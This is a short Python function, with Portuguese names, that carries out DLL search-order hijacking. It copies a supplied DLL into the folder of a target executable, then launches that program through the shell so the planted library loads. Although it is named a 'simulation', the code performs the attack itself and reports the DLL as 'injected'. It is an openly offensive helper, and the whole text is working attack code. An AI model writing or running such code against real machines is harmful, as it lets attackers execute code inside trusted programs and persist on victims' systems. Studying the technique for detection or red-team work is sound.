import shutil
import subprocess
import os

def simular_hijack(dll_path, alvo_exe):
    destino = os.path.join(os.path.dirname(alvo_exe), os.path.basename(dll_path))
    
    try:
        shutil.copyfile(dll_path, destino)
        subprocess.Popen(alvo_exe, shell=True)
        return f"[+] DLL {dll_path} injetada via hijack em {alvo_exe}"
    except Exception as e:
        return f"[ERRO] {e}"
